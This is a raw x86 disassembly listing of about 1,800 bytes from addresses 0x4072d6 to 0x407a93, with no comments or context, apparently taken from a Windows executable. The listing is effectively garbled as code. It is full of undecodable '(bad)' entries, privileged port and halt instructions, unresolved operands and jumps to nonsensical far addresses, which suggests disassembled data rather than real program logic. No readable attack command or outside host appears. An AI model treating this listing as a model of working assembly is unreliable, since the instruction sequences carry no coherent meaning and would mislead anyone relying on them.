  4072d6:	imul   esi,DWORD PTR [eax-0x22d799f],0xffffffec
  4072dd:	mov    edx,0xce49c029
  4072e2:	lea    edi,[eax]
  4072e4:	adc    eax,0xf23eee08
  4072e9:	das    
  4072ea:	cmp    al,0xe5
  4072ec:	jo     0x407344
  4072ee:	cs jo  0x407338
  4072f1:	lock inc edx
  4072f3:	or     al,0xe7
  4072f5:	iret   
  4072f6:	and    DWORD PTR [ebx],esi
  4072f8:	ror    DWORD PTR [esi-0x73eaf533],1
  4072fe:	repnz xor DWORD PTR [edi],edi
  407301:	xor    al,0x2e
  407303:	inc    esi
  407304:	add    ah,BYTE PTR [edi+0x7b]
  407307:	pop    edi
  407308:	inc    edi
  407309:	retf   
  40730a:	jg     0x40730f
  40730c:	fdivr  st,st(5)
  40730e:	cli    
  40730f:	addr16 mov ds:0xffbf,al
  407313:	arpl   WORD PTR [ebx],ax
  407315:	out    dx,al
  407316:	pop    edi
  407317:	(bad)  
  407318:	loope  0x4072a6
  40731a:	push   0x4fabcc16
  40731f:	xor    eax,ecx
  407321:	dec    esi
  407322:	dec    edi
  407323:	cld    
  407324:	jl     0x40733f
  407326:	mul    BYTE PTR [ecx]
  407328:	xor    al,0x1b
  40732a:	jl     0x40733c
  40732c:	or     ch,0x90
  40732f:	jge    0x4073aa
  407331:	fs push edx
  407333:	out    0x82,eax
  407335:	jae    0x4072cf
  407337:	lahf   
  407338:	ins    DWORD PTR es:[edi],dx
  407339:	out    0x94,al
  40733b:	and    BYTE PTR [esi+0xd],ah
  40733e:	add    BYTE PTR [ecx-0x6c],bh
  407341:	mov    ch,0xed
  407343:	retf   
  407344:	push   ebx
  407345:	push   ss
  407346:	lods   eax,DWORD PTR ds:[esi]
  407347:	mov    ecx,0x7d270a1d
  40734c:	sti    
  40734d:	lea    eax,[edi]
  40734f:	(bad)  
  407351:	push   edx
  407352:	jecxz  0x407385
  407354:	je     0x4073a4
  407356:	mov    ch,0x75
  407358:	cdq    
  407359:	ds daa 
  40735b:	push   ebx
  40735c:	xchg   edx,eax
  40735d:	cdq    
  40735e:	dec    esi
  40735f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407360:	mov    ds:0x81e5464a,eax
  407365:	mov    edi,0x88b0c939
  40736a:	mov    DWORD PTR [eax+0x3ce984ca],edi
  407370:	push   0x68
  407372:	mov    WORD PTR [edx],?
  407374:	popa   
  407375:	popf   
  407376:	dec    ecx
  407377:	or     BYTE PTR [esi-0xa],ah
  40737a:	rcl    BYTE PTR [edx-0x6d],cl
  40737d:	dec    esi
  40737e:	repnz repnz test BYTE PTR [edx],0x31
  407383:	mov    esi,0xb9e80aff
  407388:	out    0x27,al
  40738a:	test   al,0x97
  40738c:	(bad)  
  40738d:	xor    al,0x22
  40738f:	sub    esp,DWORD PTR [ebx+0x3cc9dd87]
  407395:	adc    al,0x10
  407397:	jae    0x4073de
  407399:	inc    edi
  40739a:	inc    eax
  40739b:	mov    edx,0xb898342b
  4073a0:	ins    DWORD PTR es:[edi],dx
  4073a1:	push   ebp
  4073a2:	xor    al,0x8b
  4073a4:	shl    BYTE PTR [ebp+0x3d1529c7],0x9
  4073ab:	jg     0x40733f
  4073ad:	aaa    
  4073ae:	out    0x9e,eax
  4073b0:	xchg   ebx,eax
  4073b1:	jl     0x40739b
  4073b3:	out    0x13,eax
  4073b5:	ror    ch,cl
  4073b7:	(bad)  
  4073b8:	pop    esp
  4073b9:	pop    ebx
  4073ba:	daa    
  4073bb:	in     eax,0xa7
  4073bd:	dec    ebx
  4073be:	stos   DWORD PTR es:[edi],eax
  4073bf:	or     esp,DWORD PTR [edi-0x1c]
  4073c2:	inc    ebp
  4073c3:	aaa    
  4073c4:	pop    ebp
  4073c5:	and    DWORD PTR [ecx+0x560db723],0xffffffda
  4073cc:	pop    esi
  4073cd:	pop    esi
  4073ce:	pop    ecx
  4073cf:	loope  0x407401
  4073d1:	je     0x4073d3
  4073d3:	and    ah,bl
  4073d5:	cmp    al,BYTE PTR [esi+eax*8]
  4073d8:	dec    edi
  4073d9:	mov    ah,0x78
  4073db:	int3   
  4073dc:	in     al,dx
  4073dd:	add    eax,0x59a370ad
  4073e2:	ret    
  4073e3:	pop    ebp
  4073e4:	jmp    0xad6dca80
  4073e9:	ins    DWORD PTR es:[edi],dx
  4073ea:	mov    ds:0x4f1c50f1,eax
  4073ef:	ins    DWORD PTR es:[edi],dx
  4073f0:	adc    al,0x52
  4073f2:	loope  0x4073d6
  4073f4:	jl     0x4073a5
  4073f6:	les    eax,FWORD PTR [ebx]
  4073f8:	fwait
  4073f9:	int3   
  4073fa:	call   0x4feb49fe
  4073ff:	jle    0x40742a
  407401:	ret    0x6c4
  407404:	dec    esp
  407405:	cmc    
  407406:	adc    al,ch
  407408:	mov    es,WORD PTR [ebx]
  40740a:	pop    esp
  40740b:	aad    0x1e
  40740d:	lea    ebx,[edi-0x15313582]
  407413:	ret    
  407414:	mov    dl,0xa2
  407416:	push   0x4b
  407418:	sub    ebp,ebp
  40741a:	repz popa 
  40741c:	sbb    bl,dh
  40741e:	ret    
  40741f:	inc    dl
  407421:	scas   eax,DWORD PTR es:[edi]
  407422:	jp     0x40741e
  407424:	push   eax
  407425:	cmp    al,0x3d
  407427:	mov    eax,0xa9c5dc4f
  40742c:	push   eax
  40742d:	jae    0x407464
  40742f:	outs   dx,BYTE PTR ds:[esi]
  407430:	sbb    al,0x55
  407432:	retf   
  407433:	ja     0x4073f8
  407435:	sub    al,0xe0
  407437:	pop    eax
  407438:	imul   edi,DWORD PTR [edi+esi*1],0xf71f5482
  40743f:	dec    esp
  407440:	(bad)  
  407441:	mov    esi,0xf9fc7789
  407446:	xlat   BYTE PTR ds:[ebx]
  407447:	fcmove st,st(6)
  407449:	rol    DWORD PTR [esp+ebp*2],1
  40744c:	ret    0x2f11
  40744f:	rcr    DWORD PTR [esi-0x44],0x70
  407453:	ins    BYTE PTR es:[edi],dx
  407454:	and    esp,DWORD PTR [ebx-0x79]
  407457:	mov    bh,0x82
  407459:	aas    
  40745a:	or     BYTE PTR [ebx+esi*2-0x44e1ca58],dh
  407461:	imul   edx,DWORD PTR [esi+0x41f1d012],0x86b5bd8f
  40746b:	push   ebp
  40746c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40746d:	inc    eax
  40746e:	xchg   ebx,eax
  40746f:	sub    BYTE PTR fs:[eax+0x18],dh
  407473:	stos   DWORD PTR es:[edi],eax
  407474:	jl     0x407402
  407476:	sbb    al,0x62
  407478:	jmp    0x1454:0xea4ac0bc
  40747f:	cmp    edx,ebp
  407481:	test   dh,bh
  407483:	dec    ebp
  407484:	adc    cl,0xd5
  407487:	xchg   ecx,ebx
  407489:	les    esp,FWORD PTR [eax+0x76d9c7c9]
  40748f:	stc    
  407490:	fwait
  407491:	cs aas 
  407493:	or     DWORD PTR [edi+0x55],edx
  407496:	add    al,0x71
  407498:	xchg   BYTE PTR [eax+0x11],ch
  40749b:	push   ds
  40749c:	cdq    
  40749d:	rcr    BYTE PTR fs:0x44b5d464,cl
  4074a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a5:	and    DWORD PTR [esi-0x2d],edx
  4074a8:	mov    ah,0xd6
  4074aa:	inc    ecx
  4074ab:	push   esi
  4074ac:	cmp    bh,BYTE PTR [edi]
  4074ae:	int    0xc6
  4074b0:	cwde   
  4074b1:	and    eax,0x3bec0e34
  4074b7:	cli    
  4074b8:	in     eax,dx
  4074b9:	test   eax,0xa85d3ee4
  4074be:	jb     0x4074e3
  4074c0:	sbb    eax,0x34812cb7
  4074c5:	imul   ebx,DWORD PTR [esi*1+0x5ceb33b],0xffffff9d
  4074cd:	repnz hlt 
  4074cf:	int    0x1
  4074d1:	mov    eax,0x31a8a400
  4074d6:	add    eax,0x1642886
  4074db:	dec    ecx
  4074dc:	dec    esp
  4074dd:	push   ebx
  4074de:	les    edx,FWORD PTR [eax+0x797335e4]
  4074e4:	sub    dh,cl
  4074e6:	mov    eax,ds:0xf8de4301
  4074eb:	mov    ds:0x8c765729,al
  4074f0:	pop    edx
  4074f1:	ins    BYTE PTR es:[edi],dx
  4074f2:	mov    bh,0x3d
  4074f4:	lahf   
  4074f5:	test   DWORD PTR [eax+eiz*1-0x19cbf969],ebx
  4074fc:	(bad)  
  4074fd:	cli    
  4074fe:	jmp    0x407527
  407500:	lods   al,BYTE PTR ds:[esi]
  407501:	xor    DWORD PTR [esi+0x302b8678],ecx
  407507:	mov    DWORD PTR [ebx+0x75],ebx
  40750a:	mov    esi,0x61dec1cd
  40750f:	les    edi,FWORD PTR [ecx+0x8]
  407512:	xchg   BYTE PTR [edi+ebx*1+0x76ae9359],bl
  407519:	dec    esi
  40751a:	fisttp QWORD PTR [edx]
  40751c:	adc    al,BYTE PTR [edi]
  40751e:	aas    
  40751f:	adc    BYTE PTR [edi+0x420de633],dl
  407525:	loop   0x4074bb
  407527:	xchg   esi,eax
  407528:	das    
  407529:	(bad)  
  40752a:	fadd   st,st(6)
  40752c:	xor    DWORD PTR [ecx+0x76],esp
  40752f:	outs   dx,DWORD PTR ds:[esi]
  407530:	(bad)  
  407531:	pop    esp
  407532:	cmovs  edx,DWORD PTR [esi+esi*1+0x9e2d8f]
  40753a:	ror    BYTE PTR [ebx],1
  40753c:	and    eax,0x2268ca25
  407541:	pop    esp
  407542:	(bad)  
  407543:	fiadd  WORD PTR [edx+0x17]
  407546:	sub    DWORD PTR [edx-0x3cc4bfba],ecx
  40754c:	sbb    ah,BYTE PTR [eax-0x30]
  40754f:	add    eax,0x215011eb
  407554:	xchg   edi,eax
  407555:	pop    eax
  407556:	xor    al,0x18
  407558:	mov    edi,0x4fb08ec2
  40755d:	fwait
  40755e:	pop    ebx
  40755f:	push   ebx
  407560:	scas   eax,DWORD PTR es:[edi]
  407561:	mov    eax,ds:0x382a5d2e
  407566:	out    dx,eax
  407567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407568:	mov    ch,0x3f
  40756a:	loope  0x40753b
  40756c:	test   DWORD PTR [esp+edx*2],ebx
  40756f:	xor    DWORD PTR [edx],0x6b
  407572:	inc    esp
  407573:	mov    al,bl
  407575:	mov    edx,DWORD PTR [ebx]
  407577:	out    dx,al
  407578:	je     0x407552
  40757a:	(bad)  
  40757b:	std    
  40757c:	dec    ebx
  40757d:	mov    ebx,0xabe1cbb9
  407582:	(bad)  
  407583:	sti    
  407584:	(bad)  [esi]
  407586:	sub    ah,BYTE PTR [edi]
  407588:	add    edi,esp
  40758a:	int    0x32
  40758c:	inc    esp
  40758d:	sub    edx,DWORD PTR [ebx-0x46b64882]
  407593:	jle    0x40755a
  407595:	pop    eax
  407596:	ins    BYTE PTR es:[edi],dx
  407597:	sti    
  407598:	push   ds
  407599:	not    DWORD PTR [ebp+0x568ee77c]
  40759f:	jno    0x407557
  4075a1:	repnz fisubr DWORD PTR [edx+0x7513e4ed]
  4075a8:	fnsave [ecx-0x79fa2a41]
  4075ae:	cs jmp 0x4075ee
  4075b1:	imul   edx,DWORD PTR ss:[ebx+0x3397c007],0xf1e00b83
  4075bc:	or     eax,0x69765ecb
  4075c1:	push   ecx
  4075c2:	push   esp
  4075c3:	retf   
  4075c4:	pusha  
  4075c5:	sahf   
  4075c6:	pop    esp
  4075c7:	std    
  4075c8:	inc    ebp
  4075c9:	or     esp,DWORD PTR [ebx]
  4075cb:	retf   0x9142
  4075ce:	adc    BYTE PTR [esi],ah
  4075d0:	fiadd  DWORD PTR [ebx+0x4a7a5f48]
  4075d6:	sahf   
  4075d7:	and    eax,0xa8f97a79
  4075dc:	call   0xef8a56f9
  4075e1:	cli    
  4075e2:	sub    eax,0xe7380caf
  4075e7:	arpl   WORD PTR [ecx+0xdba5036],cx
  4075ed:	lods   al,BYTE PTR ds:[esi]
  4075ee:	and    bl,al
  4075f0:	push   ds
  4075f1:	xor    edi,edi
  4075f3:	xchg   esi,eax
  4075f4:	xor    cl,ah
  4075f6:	fidivr DWORD PTR [ebx-0x44ca6c65]
  4075fc:	fwait
  4075fd:	sbb    dh,BYTE PTR [edi+0x4213fff5]
  407603:	xlat   BYTE PTR ds:[ebx]
  407604:	aas    
  407605:	mov    al,0x83
  407607:	xchg   edi,eax
  407608:	xlat   BYTE PTR ds:[ebx]
  407609:	dec    ebx
  40760a:	out    0x1,al
  40760c:	inc    ecx
  40760d:	xor    al,0xa
  40760f:	outs   dx,DWORD PTR ds:[esi]
  407610:	jne    0x4075c4
  407612:	jge    0x407615
  407614:	inc    esi
  407615:	(bad)  
  407616:	out    0x32,eax
  407618:	bound  ebp,QWORD PTR [edi+ecx*1-0x5a]
  40761c:	dec    ecx
  40761d:	(bad)  
  40761e:	adc    eax,0x6bacc2a3
  407623:	rcl    DWORD PTR [edi],0xed
  407626:	rcr    DWORD PTR [ebx+eiz*2-0x6d9c46da],0xa
  40762e:	(bad)  
  40762f:	int3   
  407630:	aam    0x85
  407632:	test   BYTE PTR [esi-0x76],cl
  407635:	add    eax,0x3bc16550
  40763a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40763b:	and    esi,DWORD PTR [edi+ebx*2-0x55dec01a]
  407642:	push   esi
  407643:	cld    
  407644:	lea    ecx,[esi-0x61]
  407647:	call   FWORD PTR [edx+0x1c]
  40764a:	loope  0x407612
  40764c:	loope  0x407670
  40764e:	sbb    esp,DWORD PTR [esi-0x22]
  407651:	sbb    edi,edx
  407653:	aaa    
  407654:	popf   
  407655:	mov    edx,gs
  407657:	imul   edi,DWORD PTR [edx-0x72],0x23
  40765b:	test   al,bh
  40765d:	jle    0x4075f3
  40765f:	sbb    al,0xa2
  407661:	sub    BYTE PTR [eax-0x7],ch
  407664:	popf   
  407665:	pop    ecx
  407666:	adc    DWORD PTR [esi+0x3e],esi
  407669:	dec    ebx
  40766a:	rcr    BYTE PTR cs:[edx+ecx*1-0x7a],cl
  40766f:	mov    eax,ds:0x640e4e9d
  407674:	lahf   
  407675:	xor    DWORD PTR [ebx-0x71],ecx
  407678:	loop   0x40761c
  40767a:	sar    ecx,cl
  40767c:	or     BYTE PTR ds:0x9013f1cc,0xc0
  407683:	int    0x49
  407685:	sbb    BYTE PTR [esi],dh
  407687:	into   
  407688:	sbb    eax,0xf934ee35
  40768d:	mov    BYTE PTR [bp+si+0x2bdb],0xc2
  407693:	rol    DWORD PTR [ebx+0x2e],1
  407696:	add    BYTE PTR [edi-0x66],cl
  407699:	pop    esi
  40769a:	ret    0x8745
  40769d:	dec    ebp
  40769e:	retf   
  40769f:	and    al,dh
  4076a1:	or     eax,0xc3a8be21
  4076a6:	mov    ?,WORD PTR ds:0xc816f31f
  4076ac:	rcr    DWORD PTR [edi+0x4e],1
  4076af:	dec    eax
  4076b0:	sti    
  4076b1:	mov    esp,0x566f7a7c
  4076b6:	call   0x358b:0x64ab779
  4076bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076be:	mov    ds,WORD PTR ds:0xb5f2ecfb
  4076c4:	sbb    dh,BYTE PTR [esi+0x454ad804]
  4076ca:	icebp  
  4076cb:	jae    0x407720
  4076cd:	fidivr WORD PTR [esi+ecx*4+0x53]
  4076d1:	pop    edx
  4076d2:	adc    al,0x25
  4076d4:	ds stos DWORD PTR es:[edi],eax
  4076d6:	repz (bad) 
  4076d8:	mov    ebp,0x3186048f
  4076dd:	xor    cl,cl
  4076df:	mov    ds:0x385142f4,eax
  4076e4:	stos   DWORD PTR es:[edi],eax
  4076e5:	pop    edi
  4076e6:	dec    edi
  4076e7:	sbb    eax,0x84f2ae42
  4076ec:	mov    DWORD PTR [ecx],0x751f6889
  4076f2:	push   ecx
  4076f3:	and    eax,0x36fdf49d
  4076f8:	sbb    eax,0x60ee83f
  4076fd:	mov    al,0x77
  4076ff:	scas   eax,DWORD PTR es:[edi]
  407700:	push   cs
  407701:	stos   BYTE PTR es:[edi],al
  407702:	imul   edx,edi,0xcf9192b8
  407708:	or     al,0xa6
  40770a:	inc    ebx
  40770b:	int    0xc4
  40770d:	aas    
  40770e:	rol    DWORD PTR [esi+0x56],cl
  407711:	retf   0xd49c
  407714:	xlat   BYTE PTR ds:[ebx]
  407715:	test   BYTE PTR [edx],0xa6
  407718:	jmp    0x4cb817bd
  40771d:	push   edi
  40771e:	mov    esi,0x7040a21e
  407723:	mul    DWORD PTR [esi]
  407725:	dec    ecx
  407726:	ret    0xcefe
  407729:	pop    es
  40772a:	xor    BYTE PTR [ecx+0x24223aa2],dl
  407730:	cmp    BYTE PTR [eax-0x5d],dl
  407733:	and    BYTE PTR [ebx-0x43434f9],bl
  407739:	pop    ss
  40773a:	shl    ebx,1
  40773c:	ror    esp,cl
  40773e:	push   edi
  40773f:	dec    ebp
  407740:	jne    0x4077af
  407742:	mov    edx,0x3a61ff05
  407747:	cdq    
  407748:	loop   0x4077ad
  40774a:	fucomip st,st(2)
  40774c:	int3   
  40774d:	aam    0x1b
  40774f:	icebp  
  407750:	adc    BYTE PTR [ecx+0x70],al
  407753:	(bad)  
  407754:	(bad)  
  407755:	or     dl,BYTE PTR [esi+ebp*4]
  407758:	popf   
  407759:	mov    ds:0x86c34d1,al
  40775e:	pop    eax
  40775f:	add    cl,BYTE PTR [eax+0x1d550ee8]
  407765:	cmp    DWORD PTR [eax+0x6c3957f5],esp
  40776b:	iret   
  40776c:	adc    al,BYTE PTR [edi]
  40776e:	xchg   esi,eax
  40776f:	xchg   esp,eax
  407770:	mov    ecx,DWORD PTR [ecx]
  407772:	jmp    0x8211998f
  407777:	mov    ah,BYTE PTR [ebx-0x16c393b1]
  40777d:	faddp  st(6),st
  40777f:	clc    
  407780:	cmp    al,0x8c
  407782:	in     al,0x57
  407784:	sub    bh,BYTE PTR ss:[ebx-0xdc350bf]
  40778b:	and    BYTE PTR [esi],al
  40778d:	iret   
  40778e:	sub    ebx,DWORD PTR [edx]
  407790:	fmul   DWORD PTR [edi]
  407792:	(bad)  
  407793:	repz mov esi,0xe157b3ed
  407799:	and    esi,DWORD PTR ds:0x62000c35
  40779f:	sub    dl,BYTE PTR [ebp+0x684764c2]
  4077a5:	mov    ch,0xb1
  4077a7:	rcr    BYTE PTR [ebp-0x4e3c6694],cl
  4077ad:	cmp    ebp,DWORD PTR [edi-0x1a]
  4077b0:	stos   DWORD PTR es:[edi],eax
  4077b1:	sti    
  4077b2:	icebp  
  4077b3:	jp     0x40781e
  4077b5:	xlat   BYTE PTR ds:[ebx]
  4077b6:	xchg   ebx,eax
  4077b7:	ret    0xc289
  4077ba:	clc    
  4077bb:	aad    0x72
  4077bd:	out    0xb1,eax
  4077bf:	cmp    eax,0x669ef4f5
  4077c4:	(bad)  
  4077c5:	aad    0x8b
  4077c7:	pushf  
  4077c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077c9:	cdq    
  4077ca:	or     al,0x72
  4077cc:	jnp    0x4077fd
  4077ce:	cdq    
  4077cf:	jg     0x407834
  4077d1:	xlat   BYTE PTR ds:[ebx]
  4077d2:	arpl   WORD PTR ds:0x95a52907,cx
  4077d8:	add    al,0xf7
  4077da:	sbb    al,0x7b
  4077dc:	mov    al,0x1e
  4077de:	retf   0x2570
  4077e1:	(bad)  
  4077e2:	fmul   QWORD PTR [ecx]
  4077e4:	push   eax
  4077e5:	fucomi st,st(3)
  4077e7:	les    esp,FWORD PTR [edx-0x5f3196d0]
  4077ed:	scas   al,BYTE PTR es:[edi]
  4077ee:	sbb    ah,BYTE PTR [eax+0x3d00047e]
  4077f4:	jno    0x40781b
  4077f6:	sbb    edi,DWORD PTR [ecx+0x75842a71]
  4077fc:	scas   eax,DWORD PTR es:[edi]
  4077fd:	test   DWORD PTR [esi+edx*1+0x54afe1d2],esi
  407804:	test   BYTE PTR [eax-0x2d7f1d2f],0x75
  40780b:	pop    es
  40780c:	mov    ds:0xdc12b0a7,eax
  407811:	add    ah,bh
  407813:	sahf   
  407814:	stos   BYTE PTR es:[edi],al
  407815:	pop    ebx
  407816:	shl    BYTE PTR [eax],1
  407818:	and    BYTE PTR [edi],cl
  40781a:	jg     0x4077e4
  40781c:	enter  0xfb1c,0x2f
  407820:	fdivr  DWORD PTR [edx+0x58]
  407823:	aad    0x2e
  407825:	dec    esp
  407826:	ins    DWORD PTR es:[edi],dx
  407827:	clc    
  407828:	outs   dx,BYTE PTR ds:[esi]
  407829:	add    al,0x78
  40782c:	cmp    edx,DWORD PTR [ebp-0x1d]
  40782f:	cmp    al,0x47
  407831:	add    esi,DWORD PTR [esi+ebp*8-0x20]
  407835:	test   eax,0x4441fb9f
  40783a:	scas   al,BYTE PTR es:[di]
  40783c:	sahf   
  40783d:	sub    DWORD PTR [eax-0x7f7f83d8],esi
  407843:	sar    DWORD PTR [esi+0xe],0xb4
  407847:	(bad)  
  407848:	dec    edi
  407849:	pop    es
  40784a:	cmp    BYTE PTR [ebx+0x54aab505],dl
  407850:	mov    WORD PTR [ebx-0x66],?
  407853:	xor    DWORD PTR [ecx+0x5b],edx
  407856:	sbb    DWORD PTR [eax+0x5929dceb],esp
  40785c:	or     dl,BYTE PTR [ebx+eax*1-0x3c]
  407860:	jle    0x40789e
  407862:	add    BYTE PTR [edx],bl
  407864:	je     0x407875
  407866:	and    eax,DWORD PTR [ecx]
  407868:	pusha  
  407869:	adc    DWORD PTR [esi+0x2fc99ff7],ebx
  40786f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407870:	and    al,0xf7
  407872:	cmp    edi,DWORD PTR [esi+0x2879d3b2]
  407878:	ds retf 
  40787a:	xor    DWORD PTR [esi],edi
  40787c:	mov    ebx,0x7e85aed1
  407881:	cwde   
  407882:	dec    esp
  407883:	jmp    0x4078cd
  407885:	lea    ebp,[ebx+0x24342eed]
  40788b:	lock iret 
  40788d:	xor    eax,DWORD PTR [eax-0x36]
  407890:	cmp    BYTE PTR [ebp+0x4d],ah
  407893:	clc    
  407894:	test   BYTE PTR [ebp+ecx*8-0x5026aff3],0xa3
  40789c:	leave  
  40789d:	jae    0x40789d
  40789f:	push   esp
  4078a0:	push   eax
  4078a1:	jmp    0x407851
  4078a3:	lods   eax,DWORD PTR ds:[esi]
  4078a4:	push   edx
  4078a5:	xchg   edx,eax
  4078a6:	xor    DWORD PTR [ecx-0x49],ebx
  4078a9:	ins    BYTE PTR es:[edi],dx
  4078aa:	ins    DWORD PTR es:[edi],dx
  4078ab:	adc    DWORD PTR fs:0xaf97d9b0,ebx
  4078b2:	ins    BYTE PTR es:[edi],dx
  4078b3:	scas   al,BYTE PTR es:[edi]
  4078b4:	push   0xffffff8f
  4078b6:	or     DWORD PTR [ecx-0x51],edx
  4078b9:	cmp    al,0x3d
  4078bb:	mov    dh,BYTE PTR [edx-0x43]
  4078be:	add    al,BYTE PTR [ecx+0x3d]
  4078c1:	dec    ebx
  4078c2:	push   ecx
  4078c3:	fcom   DWORD PTR [ebx]
  4078c5:	icebp  
  4078c6:	mov    ah,0x3
  4078c8:	pop    esp
  4078c9:	add    eax,0x82a42862
  4078ce:	xchg   esi,eax
  4078cf:	push   0xb6ffd65
  4078d4:	(bad)  
  4078d5:	or     DWORD PTR [ebp+eiz*1+0x5591f6b8],ecx
  4078dc:	sbb    DWORD PTR [ebx-0x247cf3c8],0x2a
  4078e3:	xchg   ebx,eax
  4078e4:	dec    esp
  4078e5:	scas   al,BYTE PTR es:[edi]
  4078e6:	ror    BYTE PTR fs:[eax],cl
  4078e9:	push   edi
  4078ea:	(bad)  
  4078eb:	scas   al,BYTE PTR es:[edi]
  4078ec:	adc    bh,BYTE PTR ds:0x63eb2649
  4078f2:	cmp    al,BYTE PTR [esi]
  4078f4:	in     al,dx
  4078f5:	xor    BYTE PTR [eax-0x3d],ch
  4078f8:	out    0x73,eax
  4078fa:	hlt    
  4078fb:	xlat   BYTE PTR ds:[ebx]
  4078fc:	lds    ecx,FWORD PTR [eax+0x3a]
  4078ff:	add    esp,DWORD PTR [edx+0x2d7b3b06]
  407905:	bound  edx,QWORD PTR [eax]
  407907:	push   ss
  407908:	pop    eax
  407909:	and    DWORD PTR [eax+ecx*1+0x1fd94975],ecx
  407910:	dec    ebx
  407911:	ss dec eax
  407913:	or     BYTE PTR [ebx+0x3c523a43],cl
  407919:	arpl   WORD PTR cs:[esi+edi*8+0x31e513b1],sp
  407921:	ja     0x407904
  407923:	jns    0x4078fb
  407925:	xchg   ebp,eax
  407926:	clc    
  407927:	jmp    0xfc43:0x681335be
  40792e:	test   al,0x32
  407930:	xchg   esi,eax
  407931:	sub    BYTE PTR fs:[esi],bl
  407934:	push   0x95cbc1f6
  407939:	jge    0x40794b
  40793b:	sub    al,0x52
  40793d:	pop    eax
  40793e:	sar    cl,0xfc
  407941:	push   cs
  407942:	pop    ecx
  407943:	xor    ch,al
  407945:	mov    bh,ch
  407947:	mov    bl,0x93
  407949:	sbb    al,bl
  40794b:	lea    edi,[esi-0x72]
  40794e:	inc    ecx
  40794f:	and    eax,0x30ee6274
  407954:	repnz add dl,bh
  407957:	mov    WORD PTR [ecx-0x60],es
  40795a:	dec    ebp
  40795b:	mov    al,0x58
  40795d:	sub    al,0x78
  40795f:	aaa    
  407960:	push   ebp
  407961:	clc    
  407962:	cs repnz pop edi
  407965:	call   0x9f06:0x72e784ff
  40796c:	ins    BYTE PTR es:[edi],dx
  40796d:	mov    edx,0xe998276d
  407972:	sbb    dl,bh
  407974:	in     al,dx
  407975:	mov    ebx,0x9605368c
  40797a:	mov    ah,0xcc
  40797c:	imul   esi,eax,0x3
  40797f:	jg     0x4079ce
  407981:	arpl   WORD PTR ds:0x2bdcc644,dx
  407987:	xor    DWORD PTR [esp+ecx*4-0x171f4ef7],esp
  40798e:	cmp    DWORD PTR ds:0xb99d02b5,0x717c4028
  407998:	add    dh,0x7
  40799b:	xchg   esp,eax
  40799c:	add    dh,BYTE PTR [esi]
  40799e:	fidivr WORD PTR [ebx-0x6e]
  4079a1:	cld    
  4079a2:	cmp    BYTE PTR [ebp+0x4f8852d7],ch
  4079a8:	pop    ds
  4079a9:	lock pop ds
  4079ab:	sub    DWORD PTR [edx],ecx
  4079ad:	cwde   
  4079ae:	xor    eax,eax
  4079b0:	cld    
  4079b1:	(bad)  
  4079b2:	into   
  4079b3:	cli    
  4079b4:	pop    edx
  4079b5:	enter  0x710,0x81
  4079b9:	lods   eax,DWORD PTR ds:[esi]
  4079ba:	xchg   esp,eax
  4079bb:	xchg   edx,eax
  4079bc:	push   eax
  4079bd:	daa    
  4079be:	jo     0x407a1d
  4079c0:	test   DWORD PTR ds:0x531d4bce,esp
  4079c6:	imul   ebx,DWORD PTR [edi-0x4da10284],0x72ca049c
  4079d0:	inc    esi
  4079d1:	mov    eax,0xbc0606db
  4079d6:	in     eax,0x86
  4079d8:	jl     0x407a35
  4079da:	ficomp WORD PTR [edx]
  4079dc:	jg     0x407a24
  4079de:	push   esp
  4079df:	jmp    0x4079b6
  4079e1:	sub    ch,BYTE PTR [ebx]
  4079e3:	jnp    0x407a45
  4079e5:	mov    ds:0x19a724dc,eax
  4079ea:	fsubr  QWORD PTR [ecx-0x2bba6a1a]
  4079f0:	ins    BYTE PTR es:[edi],dx
  4079f1:	mov    DWORD PTR [ecx],ebp
  4079f3:	mov    dh,0xf8
  4079f5:	call   0x9bff787a
  4079fa:	cmp    edx,ecx
  4079fc:	mov    dh,0xc5
  4079fe:	sbb    eax,0x8039d698
  407a03:	mov    ds:0x564a6851,eax
  407a08:	sbb    al,0x3d
  407a0a:	dec    esp
  407a0b:	pop    ds
  407a0c:	out    dx,eax
  407a0d:	hlt    
  407a0e:	mov    esp,0x48b18399
  407a13:	fsub   DWORD PTR [eax+edi*4-0x1d]
  407a17:	enter  0x8aca,0xb8
  407a1b:	das    
  407a1c:	imul   esi,esp,0xffffffd6
  407a1f:	out    0xba,al
  407a21:	(bad)  
  407a22:	jns    0x4079e9
  407a24:	jmp    0xc9db:0xcfef7195
  407a2b:	jnp    0x4079da
  407a2d:	neg    BYTE PTR [edx+ebp*1+0x184883ab]
  407a34:	scas   eax,DWORD PTR es:[edi]
  407a35:	sahf   
  407a36:	fcmovne st,st(6)
  407a38:	cmp    dh,dh
  407a3a:	adc    al,0x1c
  407a3c:	dec    edx
  407a3d:	in     eax,dx
  407a3e:	or     BYTE PTR [ecx],bl
  407a40:	sub    edx,DWORD PTR [ecx-0x560437e8]
  407a46:	lahf   
  407a47:	ins    BYTE PTR es:[edi],dx
  407a48:	cdq    
  407a49:	inc    esi
  407a4a:	loope  0x407a34
  407a4c:	lock sti 
  407a4e:	fwait
  407a4f:	lahf   
  407a50:	call   0xcf3a:0x1e1f81bc
  407a57:	push   ds
  407a58:	lods   eax,DWORD PTR ds:[esi]
  407a59:	daa    
  407a5a:	push   ebx
  407a5b:	imul   ecx,edx,0x68
  407a5e:	xchg   ebp,eax
  407a5f:	js     0x407a15
  407a61:	icebp  
  407a62:	repz cmc 
  407a64:	test   ch,dh
  407a66:	add    eax,0x69726a62
  407a6b:	cs push cs
  407a6d:	call   eax
  407a6f:	iret   
  407a70:	cmp    al,0x64
  407a72:	int    0x55
  407a74:	push   esp
  407a75:	adc    cl,BYTE PTR [eax+0x52]
  407a78:	ret    0x9d79
  407a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7c:	stos   BYTE PTR es:[edi],al
  407a7d:	and    ecx,DWORD PTR [ebx]
  407a7f:	and    eax,0x7f4c4de
  407a84:	test   DWORD PTR [esi],0x9c15c1e5
  407a8a:	xchg   ebx,eax
  407a8b:	xlat   BYTE PTR ds:[ebx]
  407a8c:	mov    eax,ds:0xcb8af62a
  407a91:	pop    ebx
  407a92:	xchg   ecx,eax
  407a93:	in     eax,dx
